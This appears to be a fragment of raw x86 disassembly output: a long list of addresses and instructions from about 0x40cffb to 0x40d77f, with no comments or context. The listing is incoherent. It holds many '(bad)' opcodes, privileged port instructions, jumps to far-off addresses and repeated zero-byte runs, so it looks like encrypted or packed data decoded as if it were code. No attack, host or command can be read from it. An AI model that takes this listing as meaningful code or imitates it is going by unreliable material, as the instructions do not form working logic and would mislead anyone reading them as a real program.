  40cffb:	jmp    FWORD PTR [ecx-0x1f]
  40cffe:	mov    cl,0xe
  40d000:	jmp    0x25c78612
  40d005:	push   0xf032bd
  40d00a:	add    BYTE PTR [eax],al
  40d00c:	add    BYTE PTR [eax],al
  40d00e:	mov    al,ds:0x93eb9830
  40d013:	mov    dl,0x83
  40d015:	mov    ds:0x908bfe2c,al
  40d01a:	mov    DWORD PTR [ebx-0x4d6cab78],edi
  40d020:	push   cs
  40d021:	jb     0x40cfbc
  40d023:	das    
  40d024:	inc    esp
  40d026:	ds fs pop ebx
  40d029:	and    al,0x5e
  40d02b:	add    sp,WORD PTR [edi+ebp*4]
  40d02f:	jno    0x40d08c
  40d031:	mov    edx,0xe99d35a0
  40d036:	xchg   ebx,eax
  40d037:	mov    dl,0x84
  40d039:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d03a:	(bad)  
  40d03b:	scas   al,BYTE PTR es:[edi]
  40d03c:	add    BYTE PTR cs:0x250933e6,ch
  40d043:	mov    ah,0x32
  40d045:	or     eax,0xbdffbe27
  40d04a:	test   eax,0xb900f10c
  40d04f:	scas   eax,DWORD PTR es:[edi]
  40d050:	jns    0x40d0cb
  40d052:	cmp    bh,cl
  40d054:	or     cl,BYTE PTR [ebx-0x75e2e181]
  40d05a:	scas   eax,DWORD PTR es:[edi]
  40d05b:	or     eax,DWORD PTR [ebx]
  40d05d:	je     0x40d027
  40d05f:	or     eax,DWORD PTR [esi]
  40d061:	je     0x40d017
  40d063:	or     edx,DWORD PTR [eax]
  40d065:	movntps XMMWORD PTR [eax+0xc],xmm6
  40d069:	add    BYTE PTR [ecx-0x140ccc87],ch
  40d06f:	sbb    eax,0xf335
  40d074:	add    BYTE PTR [eax],al
  40d076:	add    BYTE PTR [esi+0x33],dh
  40d079:	aaa    
  40d07a:	add    ch,BYTE PTR [ecx-0x51]
  40d07d:	xor    esi,edx
  40d07f:	push   esi
  40d080:	xor    edx,DWORD PTR [edx]
  40d082:	add    bh,BYTE PTR [ecx-0x51]
  40d085:	add    esi,0xffffffc3
  40d088:	mov    dh,0x23
  40d08a:	ret    0x8d79
  40d08d:	out    0xfd,al
  40d08f:	imul   ebp,DWORD PTR [edi-0x50908f1a],0x39518b0e
  40d099:	aad    0xf
  40d09b:	lods   eax,DWORD PTR ds:[esi]
  40d09c:	in     eax,0xd
  40d09e:	add    BYTE PTR [ecx],ch
  40d0a0:	cmp    ch,al
  40d0a2:	call   0x321057
  40d0a7:	mov    ecx,0x7c0f2a92
  40d0ac:	leave  
  40d0ad:	add    DWORD PTR [ebx+0x60e6be76],ecx
  40d0b3:	les    esi,FWORD PTR [ebp-0x48b976f2]
  40d0b9:	jecxz  0x40d0c6
  40d0bb:	nop
  40d0bc:	push   eax
  40d0bd:	aas    
  40d0be:	or     al,0xe8
  40d0c0:	daa    
  40d0c1:	fild   WORD PTR [eax]
  40d0c3:	nop
  40d0c4:	bound  ebp,QWORD PTR [edi]
  40d0c6:	or     al,0x1b
  40d0c8:	dec    ebp
  40d0c9:	call   0xafb326e5
  40d0ce:	call   edi
  40d0d0:	fadd   DWORD PTR [ebp-0x7a1b8bbd]
  40d0d6:	push   esi
  40d0d7:	mov    al,ds:0xebc55
  40d0dc:	add    BYTE PTR [eax],al
  40d0de:	add    BYTE PTR [eax],al
  40d0e0:	adc    eax,0x90000998
  40d0e5:	pop    eax
  40d0e6:	xchg   ecx,eax
  40d0e7:	add    esp,DWORD PTR [edx]
  40d0e9:	repnz iret 
  40d0eb:	inc    edx
  40d0ec:	sbb    al,0xd5
  40d0ee:	iret   
  40d0ef:	dec    edi
  40d0f0:	and    eax,0x917d8c2a
  40d0f5:	inc    esp
  40d0f6:	pop    ss
  40d0f7:	sub    edx,DWORD PTR [eax]
  40d0f9:	push   edx
  40d0fa:	or     al,0x44
  40d0fc:	std    
  40d0fd:	scas   al,BYTE PTR es:[edi]
  40d0fe:	test   BYTE PTR [ebp-0x6d],al
  40d101:	mov    edi,0xb7a273ea
  40d106:	add    DWORD PTR [esp+edx*4-0x51],edi
  40d10a:	sbb    eax,0x51d89a7e
  40d10f:	mov    edi,0xc209d
  40d114:	nop
  40d115:	sahf   
  40d116:	push   ds
  40d117:	(bad)  
  40d118:	xlat   BYTE PTR ds:[ebx]
  40d119:	jmp    0x40d142
  40d11b:	or     DWORD PTR [esi-0x30],0xffffffa2
  40d11f:	xchg   ecx,eax
  40d120:	nop
  40d121:	fisttp DWORD PTR [ebx]
  40d123:	test   BYTE PTR [edx+0x9],ah
  40d126:	xchg   DWORD PTR [ecx+edx*4-0x25],edi
  40d12a:	or     eax,DWORD PTR [ebx+0x391dcf29]
  40d130:	or     ebx,edx
  40d132:	mov    edi,gs
  40d134:	gs push ss
  40d136:	adc    ebx,DWORD PTR [ecx+0x60]
  40d139:	mov    dl,0xa2
  40d13b:	pop    ss
  40d13c:	scas   eax,DWORD PTR es:[edi]
  40d13d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d13e:	fmul   QWORD PTR [eax+0x51]
  40d141:	jle    0x40d114
  40d143:	jecxz  0x40d145
  40d145:	add    BYTE PTR [eax],al
  40d147:	add    BYTE PTR [eax],al
  40d149:	mov    ah,0x67
  40d14b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d14c:	xor    al,BYTE PTR [esi+0x5f]
  40d14f:	call   0xf1ef1edd
  40d154:	jecxz  0x40d1b9
  40d156:	(bad)  
  40d157:	stc    
  40d158:	or     al,0x54
  40d15a:	scas   al,BYTE PTR es:[edi]
  40d15b:	loope  0x40d16d
  40d15d:	dec    esi
  40d15e:	mov    esp,0xa8075df8
  40d163:	adc    BYTE PTR [ebx],al
  40d165:	nop
  40d166:	mov    dl,0x92
  40d168:	add    eax,0x27f571ce
  40d16d:	mov    ebx,0x96b1617b
  40d172:	das    
  40d173:	mov    ecx,0x64b29004
  40d178:	pushf  
  40d179:	mov    WORD PTR [ecx-0x4d6f129d],?
  40d17f:	in     eax,0x88
  40d181:	lea    esi,ds:0x68bcefd6
  40d187:	xor    DWORD PTR [ebx-0x24],eax
  40d18a:	pop    esi
  40d18b:	in     al,dx
  40d18c:	fdivrp st(0),st
  40d18e:	jnp    0x40d1a4
  40d190:	cmp    BYTE PTR [edi-0x6ffd26d1],dl
  40d196:	mov    dl,0x6b
  40d198:	inc    esi
  40d199:	mov    WORD PTR [esi-0x5959e7fb],fs
  40d19f:	(bad)  
  40d1a0:	pop    ds
  40d1a1:	mov    WORD PTR [esi-0x4671e21e],fs
  40d1a7:	push   edi
  40d1a8:	les    esi,FWORD PTR [ecx+ebp*8-0x1b]
  40d1ac:	add    eax,DWORD PTR [eax]
  40d1ae:	add    BYTE PTR [eax],al
  40d1b0:	add    BYTE PTR [eax],al
  40d1b2:	nop
  40d1b3:	mov    ecx,0xe9279a62
  40d1b8:	in     eax,0xc5
  40d1ba:	(bad)  
  40d1bb:	ret    0xc0e
  40d1be:	adc    edi,ebp
  40d1c0:	or     DWORD PTR [edx-0x2a],esp
  40d1c3:	fwait
  40d1c4:	dec    ecx
  40d1c5:	cmc    
  40d1c6:	adc    BYTE PTR [eax+0x6],ch
  40d1c9:	jmp    0xf96b46d8
  40d1ce:	test   BYTE PTR [esi],ch
  40d1d0:	jmp    0x97c6:0x8bb293e9
  40d1d7:	mov    dl,0xff
  40d1d9:	fs sbb ecx,ebp
  40d1dc:	out    dx,eax
  40d1dd:	jmp    0x655f41eb
  40d1e2:	aam    0xb7
  40d1e4:	mov    dh,BYTE PTR ds:0x930eb28c
  40d1ea:	xchg   ebx,eax
  40d1eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1ec:	push   0xffffffb1
  40d1ee:	lahf   
  40d1ef:	mov    dh,0xf8
  40d1f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1f2:	xchg   edi,eax
  40d1f3:	mov    bl,0xff
  40d1f5:	pop    ebx
  40d1f6:	int3   
  40d1f7:	xor    ecx,edi
  40d1f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1fa:	call   0x8fefcab9
  40d1ff:	mov    bl,0xff
  40d201:	push   ebx
  40d202:	push   esp
  40d203:	xor    eax,0x1f952acf
  40d208:	(bad)  
  40d209:	ins    BYTE PTR es:[edi],dx
  40d20a:	(bad)  
  40d20b:	mov    ?,WORD PTR [edx]
  40d20d:	rcr    ebx,0xe0
  40d210:	or     eax,0x2a741ee9
  40d215:	fld    QWORD PTR [eax]
  40d217:	add    BYTE PTR [eax],al
  40d219:	add    BYTE PTR [eax],al
  40d21b:	mov    ds:0x98054b35,eax
  40d220:	sub    bh,0xfe
  40d223:	dec    esp
  40d224:	je     0x40d250
  40d226:	or     DWORD PTR [eax+ebp*8],edx
  40d229:	out    dx,eax
  40d22a:	jmp    0xf7779153
  40d22f:	shl    DWORD PTR [edx+0x6b9ea989],cl
  40d235:	sbb    DWORD PTR ds:0xe67838,0xcb46c
  40d23f:	mov    ch,0xf3
  40d241:	jp     0x40d2b1
  40d243:	test   eax,0x5651ec6
  40d248:	shl    DWORD PTR [ebp+0x47],cl
  40d24b:	jl     0x40d1ec
  40d24d:	sub    ah,BYTE PTR [eax]
  40d24f:	rcr    BYTE PTR [ebx],1
  40d251:	jne    0x40d24a
  40d253:	call   0xf190560b
  40d258:	cdq    
  40d259:	out    dx,eax
  40d25a:	lea    eax,ds:0x87e80fd0
  40d260:	push   eax
  40d261:	out    dx,eax
  40d262:	jmp    DWORD PTR [ebx+esi*8+0x0]
  40d266:	xchg   ebp,eax
  40d267:	jns    0x40d270
  40d269:	pcmpeqw mm6,mm4
  40d26c:	cmp    BYTE PTR [esp+0xeb379],bl
  40d273:	sub    al,0x77
  40d275:	sub    dl,BYTE PTR [eax-0x6f]
  40d278:	pop    edx
  40d279:	or     al,0x2
  40d27b:	mov    ecx,0x8d4c99
  40d280:	add    BYTE PTR [eax],al
  40d282:	add    BYTE PTR [eax],al
  40d284:	add    eax,0x91590fd0
  40d289:	jnp    0x40d282
  40d28b:	add    DWORD PTR [ecx+0x38],edi
  40d28e:	mov    WORD PTR [ecx+ecx*2],fs
  40d291:	scas   al,BYTE PTR es:[edi]
  40d292:	push   cs
  40d293:	add    BYTE PTR [ecx-0x13f386b5],bh
  40d299:	jb     0x40d2c5
  40d29b:	inc    esp
  40d29c:	pop    esi
  40d29d:	ret    
  40d29e:	push   es
  40d29f:	push   eax
  40d2a0:	fdiv   QWORD PTR [edx+0x2a]
  40d2a3:	sub    al,0x79
  40d2a5:	mov    ebx,0x953947b8
  40d2aa:	push   cs
  40d2ab:	push   0x39
  40d2ad:	mov    ds:0xb0a0b0e6,eax
  40d2b2:	push   cs
  40d2b3:	xor    ebp,0xffffffcd
  40d2b6:	test   bh,cl
  40d2b8:	nop
  40d2b9:	xor    ebx,esi
  40d2bb:	cld    
  40d2bc:	das    
  40d2bd:	cmp    BYTE PTR [eax+0x4e64ce00],ah
  40d2c3:	and    al,0x80
  40d2c5:	hlt    
  40d2c6:	cwde   
  40d2c7:	push   cs
  40d2c8:	adc    bh,BYTE PTR [esi+0x340ffe95]
  40d2ce:	add    al,BYTE PTR [ebx+0x39f4fd8]
  40d2d4:	or     ecx,DWORD PTR ds:0x1f570fd0
  40d2da:	xor    DWORD PTR [ebx+0xbca15f5],ecx
  40d2e0:	nop
  40d2e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2e2:	or     eax,0xc0d12f8
  40d2e7:	add    DWORD PTR [eax],eax
  40d2e9:	add    BYTE PTR [eax],al
  40d2eb:	add    BYTE PTR [eax],al
  40d2ed:	pop    ebp
  40d2ee:	fidivr WORD PTR ds:0x4e5b48be
  40d2f4:	add    BYTE PTR [esi-0x70],bl
  40d2f7:	std    
  40d2f8:	out    dx,eax
  40d2f9:	mov    ds:0xb8a00c19,al
  40d2fe:	pop    edx
  40d2ff:	dec    esi
  40d300:	add    al,bh
  40d302:	fstp   DWORD PTR [esi]
  40d304:	pop    ds
  40d305:	adc    esi,esi
  40d307:	sbb    ebp,DWORD PTR [ecx+0x54]
  40d30a:	(bad)  [ebx]
  40d30c:	or     al,0x91
  40d30e:	xchg   edi,eax
  40d30f:	or     eax,0xc0ff974
  40d314:	add    BYTE PTR [edi-0x29],cl
  40d317:	xchg   edi,eax
  40d318:	adc    esp,0xd0bb64db
  40d31e:	fld    TBYTE PTR [ecx-0x9]
  40d321:	adc    dl,BYTE PTR [eax+0x767560a]
  40d327:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d328:	adc    eax,edx
  40d32a:	(bad)  ds:0x3cc953c3
  40d330:	mov    eax,DWORD PTR [ecx-0xc]
  40d333:	and    al,0x49
  40d335:	xchg   edx,eax
  40d336:	mov    dl,0xe5
  40d338:	ret    0xce95
  40d33b:	pop    ds
  40d33c:	inc    esp
  40d33d:	nop
  40d33e:	mov    eax,ds:0x6ad588bc
  40d343:	xor    eax,0xe64b058d
  40d348:	add    edx,DWORD PTR [eax+0x1777503b]
  40d34e:	out    0xe5,al
  40d350:	ret    0x0
  40d353:	add    BYTE PTR [eax],al
  40d355:	add    BYTE PTR ds:0x9003e63f,dl
  40d35b:	push   cs
  40d35c:	jnp    0x40d3a1
  40d35e:	nop
  40d35f:	cmp    dh,BYTE PTR [eax+0x63]
  40d362:	mul    ebp
  40d364:	in     eax,0x9a
  40d366:	test   BYTE PTR [esi],ch
  40d368:	hlt    
  40d369:	inc    ebx
  40d36a:	nop
  40d36b:	cmp    ebp,DWORD PTR [eax+0x73]
  40d36e:	(bad)  
  40d370:	in     eax,0x8e
  40d372:	int    0x84
  40d374:	pushf  
  40d375:	(bad)  
  40d376:	cmp    WORD PTR [edi],di
  40d379:	mov    BYTE PTR [esi+0x6a],cl
  40d37c:	mov    ch,0xc2
  40d37e:	xchg   esi,eax
  40d37f:	into   
  40d380:	lahf   
  40d381:	inc    ebx
  40d382:	nop
  40d383:	in     eax,0xf2
  40d385:	pop    edi
  40d386:	xor    DWORD PTR [edx-0x1b],0xe6430e8e
  40d38d:	add    edx,DWORD PTR [eax-0x70f0d9d1]
  40d393:	cmp    al,0xef
  40d396:	pop    ss
  40d397:	shl    BYTE PTR [ebp-0x6ec821fd],0x70
  40d39e:	jg     0x40d385
  40d3a0:	in     eax,0x8c
  40d3a2:	inc    ebp
  40d3a3:	in     eax,dx
  40d3a4:	fistp  WORD PTR [edi+0x1c]
  40d3a7:	jb     0x40d38e
  40d3a9:	stos   DWORD PTR es:[edi],eax
  40d3aa:	mov    esi,0xb03e5c8
  40d3af:	je     0x40d39a
  40d3b1:	ror    BYTE PTR [ebp-0x2b70f13a],0xb2
  40d3b8:	out    0x6a,al
  40d3ba:	add    BYTE PTR [eax],al
  40d3bc:	add    BYTE PTR [eax],al
  40d3be:	add    BYTE PTR [esi-0x4e],dl
  40d3c1:	push   cs
  40d3c2:	jb     0x40d40d
  40d3c4:	int    0x17
  40d3c6:	xor    BYTE PTR [esi+0x302df8b2],cl
  40d3cc:	mov    ecx,0xad802f0d
  40d3d1:	xor    DWORD PTR [esi-0x173baa14],0xffffff93
  40d3d8:	cmp    eax,ecx
  40d3da:	push   ss
  40d3db:	(bad)  
  40d3dc:	mov    al,0xe
  40d3de:	sbb    al,dl
  40d3e0:	ficom  DWORD PTR [ecx]
  40d3e2:	push   0xffffff93
  40d3e4:	mov    dl,0xef
  40d3e6:	aad    0xd7
  40d3e8:	mov    eax,0x5b83e483
  40d3ed:	dec    edx
  40d3ee:	jmp    0x9930d108
  40d3f3:	ret    
  40d3f4:	aaa    
  40d3f5:	jmp    DWORD PTR [ebp+0x15]
  40d3f8:	popa   
  40d3f9:	adc    al,0x6c
  40d3fb:	and    ah,BYTE PTR [ecx+0x1d]
  40d3fe:	mov    al,cs:0x9772028e
  40d404:	bound  esp,QWORD PTR [ebp-0x5b]
  40d407:	xchg   ebx,eax
  40d408:	pop    eax
  40d409:	or     eax,0xc7a4401
  40d40e:	jmp    0xe8cc350e
  40d413:	xchg   ebx,eax
  40d414:	cmp    ecx,ecx
  40d416:	lahf   
  40d417:	push   esp
  40d418:	lock or ch,cl
  40d41b:	mov    esi,0x386ae337
  40d420:	mov    eax,0x3c84
  40d425:	add    BYTE PTR [eax],al
  40d427:	add    BYTE PTR [ecx+0x2272587f],cl
  40d42d:	mov    ds:0xf0c1e6d3,al
  40d432:	mov    eax,ecx
  40d434:	xchg   ebx,eax
  40d435:	pop    esi
  40d436:	cmp    al,BYTE PTR [eax]
  40d438:	mov    eax,ds:0x9c4812c2
  40d43d:	mov    ds:0xa0064581,eax
  40d442:	add    DWORD PTR [ebp+0x1],0x1d4581a0
  40d449:	mov    al,ds:0xa12575ef
  40d44e:	or     esi,0x11
  40d451:	lods   al,BYTE PTR ds:[esi]
  40d452:	or     BYTE PTR [eax],al
  40d454:	cmp    DWORD PTR [edi],edx
  40d456:	lea    ebp,es:[ecx+ecx*2+0x40]
  40d45b:	push   0x29
  40d45d:	xchg   esi,eax
  40d45e:	push   cs
  40d45f:	dec    DWORD PTR [esp+ebp*4]
  40d462:	pop    ebp
  40d463:	mov    esp,DWORD PTR [edi]
  40d465:	sbb    BYTE PTR [ebp+0x5],al
  40d468:	jmp    0xe356b81c
  40d46d:	scas   eax,DWORD PTR es:[edi]
  40d46e:	out    dx,eax
  40d46f:	jne    0x40d45e
  40d471:	ss ret 0xbcff
  40d475:	fcomip st,st(0)
  40d477:	jne    0x40d45e
  40d479:	dec    edx
  40d47a:	jnp    0x40d484
  40d47c:	inc    ecx
  40d47d:	test   DWORD PTR [eax+eax*1],ecx
  40d480:	mov    ecx,0xab84c035
  40d485:	mov    bl,0x14
  40d487:	xor    BYTE PTR [edx-0x53],0x79
  40d48b:	or     DWORD PTR [eax],eax
  40d48d:	add    BYTE PTR [eax],al
  40d48f:	add    BYTE PTR [eax],al
  40d491:	mov    bl,0x1e
  40d493:	jl     0x40d4a6
  40d495:	cmp    DWORD PTR [ebp+0xd],eax
  40d498:	je     0x40d45f
  40d49a:	das    
  40d49b:	test   BYTE PTR [ecx],0x1d
  40d49e:	mov    edx,0x4629c3f0
  40d4a3:	or     eax,0xe7ff672
  40d4a8:	pop    esi
  40d4a9:	and    bh,al
  40d4ab:	int    0x10
  40d4ad:	imul   eax,DWORD PTR [ecx],0x2f5febb0
  40d4b3:	in     al,0x1c
  40d4b5:	nop
  40d4b6:	test   al,0x3d
  40d4b8:	mov    esi,DWORD PTR [ebp-0x6fbbde77]
  40d4be:	ret    
  40d4bf:	pop    ds
  40d4c0:	mov    eax,0x2ffc28
  40d4c5:	dec    edi
  40d4c6:	dec    ecx
  40d4c7:	test   BYTE PTR [ebx+0x6c],bh
  40d4ca:	fstp   st(4)
  40d4cc:	enter  0x8d13,0xee
  40d4d0:	cmp    ebp,DWORD PTR [eax+eiz*2-0xa237866]
  40d4d7:	cld    
  40d4d8:	jae    0x40d544
  40d4da:	pop    eax
  40d4db:	push   ss
  40d4dc:	and    al,0x5c
  40d4de:	mov    ebx,0xdacc8507
  40d4e3:	or     eax,DWORD PTR [eax]
  40d4e5:	pmulhw mm1,mm7
  40d4e8:	inc    ebx
  40d4e9:	sbb    ecx,DWORD PTR [ebp-0x379fbc12]
  40d4ef:	mov    bl,0x56
  40d4f1:	push   ebx
  40d4f2:	sub    BYTE PTR [ebp+0xcc],al
  40d4f8:	add    BYTE PTR [eax],al
  40d4fa:	clc    
  40d4fb:	lods   eax,DWORD PTR ds:[esi]
  40d4fc:	xchg   edi,eax
  40d4fd:	(bad)  
  40d4fe:	out    0x4c,eax
  40d500:	retf   0x150e
  40d503:	mov    ah,0x9
  40d505:	add    BYTE PTR [eax-0x2274c2c4],dl
  40d50b:	jo     0x40d4d7
  40d50d:	inc    edi
  40d50e:	xchg   edx,eax
  40d50f:	fldenv [eax]
  40d511:	jmp    DWORD PTR [ebp+0x9]
  40d514:	mov    ds:0xbd99114,eax
  40d519:	mov    edx,DWORD PTR [ebp+esi*8+0x4b]
  40d51d:	xor    ecx,ebx
  40d51f:	pop    ss
  40d520:	rcl    DWORD PTR [edi],cl
  40d522:	pop    DWORD PTR [ebp-0x2c2f7c36]
  40d528:	outs   dx,DWORD PTR ds:[esi]
  40d529:	add    BYTE PTR [ecx-0x1eaef435],dl
  40d52f:	dec    eax
  40d530:	cmp    eax,0xddb34d8b
  40d535:	repnz iret 
  40d537:	mov    ah,0xe5
  40d539:	mov    ebx,ss
  40d53b:	xchg   esi,eax
  40d53c:	adc    DWORD PTR [ecx-0x56964dd9],eax
  40d542:	pop    edi
  40d543:	loop   0x40d52a
  40d545:	mov    BYTE PTR [edi],al
  40d547:	xor    esp,edi
  40d549:	add    edx,DWORD PTR [eax-0x5c1fedd5]
  40d54f:	xor    eax,0xe23f877c
  40d554:	in     eax,0x2
  40d556:	xchg   DWORD PTR [edi],esi
  40d558:	stos   DWORD PTR es:[edi],eax
  40d559:	add    edx,DWORD PTR [eax+0x4b6ab2]
  40d55f:	add    BYTE PTR [eax],al
  40d561:	add    BYTE PTR [eax],al
  40d563:	mov    al,ds:0x7be0122b
  40d568:	sub    eax,0xcc51403f
  40d56d:	in     al,0x8d
  40d56f:	loopne 0x40d4f5
  40d571:	ins    DWORD PTR es:[edi],dx
  40d572:	aaa    
  40d573:	lods   al,BYTE PTR ds:[esi]
  40d574:	leave  
  40d575:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d577:	nop
  40d578:	loope  0x40d5e2
  40d57a:	xchg   esi,eax
  40d57b:	movq   mm1,QWORD PTR [ecx]
  40d57e:	clc    
  40d57f:	sbb    BYTE PTR [edi+0x1],ch
  40d582:	loopne 0x40d598
  40d584:	imul   edx,ebp,0x34
  40d587:	inc    eax
  40d588:	loope  0x40d53b
  40d58a:	fbstp  TBYTE PTR [ebx-0x23756977]
  40d590:	retf   0x79e
  40d593:	nop
  40d594:	mov    dl,0x69
  40d596:	ret    
  40d597:	inc    ebx
  40d598:	push   ebp
  40d599:	jl     0x40d5e2
  40d59b:	ins    BYTE PTR es:[edi],dx
  40d59c:	(bad)  
  40d59d:	bound  edi,QWORD PTR [edi]
  40d59f:	je     0x40d55b
  40d5a1:	mov    ch,0xab
  40d5a3:	shl    BYTE PTR [eax],0xe4
  40d5a6:	add    ecx,DWORD PTR [ecx]
  40d5a8:	jg     0x40d56b
  40d5aa:	fisttp WORD PTR [edx]
  40d5ac:	jg     0x40d577
  40d5ae:	neg    DWORD PTR [edx]
  40d5b0:	ins    DWORD PTR es:[edi],dx
  40d5b1:	push   cs
  40d5b2:	mov    ebp,0x755a6e6a
  40d5b7:	scas   al,BYTE PTR es:[edi]
  40d5b8:	sub    eax,0x55112144
  40d5bd:	sub    dl,BYTE PTR [ecx]
  40d5bf:	xchg   esp,eax
  40d5c0:	aaa    
  40d5c1:	(bad)  
  40d5c2:	pop    ebp
  40d5c3:	int    0x32
  40d5c5:	jae    0x40d5cc
  40d5c7:	add    BYTE PTR [eax],al
  40d5c9:	add    BYTE PTR [eax],al
  40d5cb:	add    BYTE PTR [ecx+eiz*8+0x7b],dh
  40d5cf:	xor    DWORD PTR [ecx],edi
  40d5d1:	jb     0x40d5e9
  40d5d3:	out    dx,al
  40d5d4:	shl    BYTE PTR [ebx+0x16],1
  40d5d7:	sbb    DWORD PTR ds:0xacd2a65,ebx
  40d5dd:	jne    0x40d609
  40d5df:	rcr    DWORD PTR [edx+eiz*2],1
  40d5e2:	sbb    bl,BYTE PTR [esi+0x29187d3f]
  40d5e8:	mov    WORD PTR ds:0x2c37c55b,gs
  40d5ee:	dec    esp
  40d5ef:	ror    DWORD PTR [eax],0x6d
  40d5f2:	sub    cl,cl
  40d5f4:	adc    ch,dh
  40d5f6:	add    ah,BYTE PTR [eax-0x44]
  40d5f9:	mov    edx,0x2f6b815c
  40d5fe:	or     eax,0xefc728e9
  40d603:	hlt    
  40d604:	arpl   bx,ax
  40d606:	dec    esi
  40d607:	jmp    0xe94cabca
  40d60c:	xchg   ebx,eax
  40d60d:	adc    ax,0xb06a
  40d611:	xchg   esi,eax
  40d612:	sub    ch,cl
  40d614:	sbb    dh,BYTE PTR [ebp+0x2a]
  40d617:	add    DWORD PTR [edx-0x56],edi
  40d61a:	and    DWORD PTR [ebp-0x6ca16721],0xc57ae197
  40d624:	outs   dx,DWORD PTR ds:[esi]
  40d625:	mov    edi,ebp
  40d627:	aas    
  40d628:	sbb    DWORD PTR [ebp+0x2a],esi
  40d62b:	aad    0x8
  40d62d:	stc    
  40d62e:	out    0x0,al
  40d630:	add    BYTE PTR [eax],al
  40d632:	add    BYTE PTR [eax],al
  40d634:	add    BYTE PTR [edi-0x5f],bl
  40d637:	or     eax,0x2abaf900
  40d63c:	adc    edi,DWORD PTR [ecx-0x4f]
  40d63f:	and    ch,al
  40d641:	cmp    eax,0x3000f35
  40d646:	sbb    al,0x8c
  40d648:	fcmovnb st,st(5)
  40d64a:	(bad)  
  40d64c:	pop    ebx
  40d64d:	clc    
  40d64e:	mov    ah,0xe
  40d650:	inc    ebp
  40d652:	ror    BYTE PTR [ebx-0x1],cl
  40d655:	xchg   ebp,eax
  40d656:	ror    BYTE PTR [ebx-0x1],cl
  40d659:	test   edx,edx
  40d65b:	dec    ebx
  40d65c:	inc    DWORD PTR [ebp-0x11a8b42e]
  40d662:	or     eax,0xdf95db8c
  40d667:	out    0xb9,eax
  40d669:	mov    ecx,0x5f5f0eb4
  40d66e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d66f:	push   ebx
  40d670:	xor    ebp,0xffffffe7
  40d673:	int    0x18
  40d675:	sub    DWORD PTR [ecx-0x4f71137d],edx
  40d67b:	push   ss
  40d67c:	inc    DWORD PTR [eax+edx*8]
  40d67f:	lock jne 0x40d65b
  40d682:	inc    esi
  40d683:	jnp    0x40d691
  40d685:	outs   dx,BYTE PTR ds:[esi]
  40d686:	mov    al,0x6
  40d688:	push   ecx
  40d689:	inc    ecx
  40d68a:	pop    es
  40d68b:	repnz (bad) 
  40d68d:	ds test al,0xcc
  40d690:	adc    al,0xe9
  40d692:	xor    ah,ah
  40d694:	and    dl,bh
  40d696:	nop
  40d697:	sub    ecx,0x0
  40d69a:	add    BYTE PTR [eax],al
  40d69c:	add    BYTE PTR [eax],al
  40d69e:	inc    edx
  40d69f:	ja     0x40d6cb
  40d6a1:	xor    al,0x27
  40d6a3:	(bad)
  40d6a7:	mov    cl,0x83
  40d6a9:	pop    esp
  40d6aa:	lds    esi,FWORD PTR [ebx-0x39]
  40d6ad:	inc    esp
  40d6ae:	aad    0xcb
  40d6b0:	dec    eax
  40d6b1:	inc    ebp
  40d6b2:	nop
  40d6b3:	sbb    eax,0xf554c70c
  40d6b8:	fild   WORD PTR [edx]
  40d6ba:	nop
  40d6bb:	leave  
  40d6bc:	or     esi,esi
  40d6be:	push   ebx
  40d6bf:	retf   0x1e00
  40d6c2:	adc    esp,esp
  40d6c4:	lock jne 0x40d660
  40d6c7:	dec    edx
  40d6c8:	aam    0x67
  40d6ca:	nop
  40d6cb:	jge    0x40d6d7
  40d6cd:	jne    0x40d650
  40d6cf:	sbb    dl,BYTE PTR [eax+0x70c9fa4a]
  40d6d5:	rol    bl,1
  40d6d7:	mov    esp,0xc815e7b1
  40d6dc:	or     al,BYTE PTR [eax]
  40d6de:	cmp    esp,ecx
  40d6e0:	xor    BYTE PTR [ebx-0x13160e9d],cl
  40d6e6:	aas    
  40d6e7:	adc    BYTE PTR [eax+0x7b],dh
  40d6ea:	ins    BYTE PTR es:[edi],dx
  40d6eb:	rcr    eax,1
  40d6ed:	cmc    
  40d6ee:	(bad)  
  40d6ef:	call   0x438d:0x916c4371
  40d6f6:	je     0x40d68d
  40d6f8:	cmp    ch,BYTE PTR [edx+0x72]
  40d6fb:	mov    edi,0xe1b5133
  40d700:	xchg   ebx,eax
  40d701:	adc    BYTE PTR [eax],al
  40d703:	add    BYTE PTR [eax],al
  40d705:	add    BYTE PTR [eax],al
  40d707:	sahf   
  40d708:	leave  
  40d709:	or     ecx,DWORD PTR [ecx-0x75200aac]
  40d70f:	dec    esp
  40d710:	lods   eax,DWORD PTR ds:[esi]
  40d711:	fimul  WORD PTR [eax-0x771d4a9c]
  40d717:	pop    esp
  40d718:	lods   eax,DWORD PTR ds:[esi]
  40d719:	ret    0x5488
  40d71c:	mov    ch,0xde
  40d71e:	call   0x4ca056
  40d723:	sbb    ebx,DWORD PTR ds:0xc48337e8
  40d729:	aaa    
  40d72a:	lea    edx,[ebp+esi*4-0x1e]
  40d72e:	dec    edi
  40d72f:	add    eax,0x7fe7a1b2
  40d734:	sbb    BYTE PTR [ebx-0x5e08c120],0xe7
  40d73b:	ja     0x40d6f2
  40d73d:	in     eax,0x3
  40d73f:	nop
  40d740:	fist   WORD PTR [edx-0x1924ecd5]
  40d746:	pop    ss
  40d747:	(bad)  
  40d748:	mov    eax,ds:0xb38a9d25
  40d74d:	in     eax,0x3
  40d74f:	jecxz  0x40d6d4
  40d751:	jp     0x40d79a
  40d753:	mov    ah,0x72
  40d755:	xor    eax,0x3081b21e
  40d75a:	xor    eax,0x4dcdf00b
  40d75f:	jl     0x40d713
  40d761:	in     eax,0x7e
  40d763:	jmp    0x40d6fb
  40d765:	or     eax,0xa63858d7
  40d76a:	add    al,BYTE PTR [eax]
  40d76c:	add    BYTE PTR [eax],al
  40d76e:	add    BYTE PTR [eax],al
  40d770:	aam    0xfb
  40d772:	hlt    
  40d773:	cdq    
  40d774:	fld    QWORD PTR [ebx+0x6a74477e]
  40d77a:	bound  eax,QWORD PTR [edi+0x6c]
  40d77d:	jbe    0x40d7b4
  40d77f:	sbb    al,0x73
